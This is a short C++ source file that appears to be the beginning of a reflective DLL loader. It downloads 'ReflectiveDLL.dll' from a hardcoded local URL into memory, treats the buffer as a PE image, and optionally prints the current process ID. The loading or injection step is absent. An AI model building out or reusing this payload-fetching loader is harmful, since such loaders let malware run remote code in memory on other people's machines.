#include "framework.h"
#include "args.h"
#include "download.h"
#include <vector>
#include <iostream>

int main(int argc, char* argv[]) {

	i_arg_t arguments = argument_parser(argc, argv);

	const char* url = "http://127.0.0.1/ReflectiveDLL.dll";
	std::vector<char> pefile = download_from_url(url);

	PBYTE pebase = (PBYTE)(pefile.data());

	if (pefile.size() == 0) {
		std::cerr << "[-] Error while downloading file\n";
		return 1;
	}

	if (arguments.is_local) {
		//print the PID of the current process
		DWORD pid = GetCurrentProcessId();
		printf("[+] Current process PID: %lu\n", pid);
	}

}
